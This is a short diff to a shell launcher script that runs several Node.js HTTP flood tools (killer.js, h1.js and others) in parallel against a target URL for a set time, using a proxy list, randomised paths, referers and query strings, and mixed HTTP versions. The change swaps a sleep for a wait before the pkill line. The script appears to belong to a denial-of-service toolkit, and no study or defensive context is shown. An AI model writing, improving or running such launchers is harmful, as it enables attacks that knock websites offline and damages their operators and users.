@@ -19,7 +19,5 @@ node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix 
 node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
 node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
 node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
-
-# Dừng toàn bộ sau khi chạy xong TIME giây
-sleep $TIME
+wait
 pkill -f "hmix.js|h1.js|h2.js|killer.js|http1.js|http2.js"
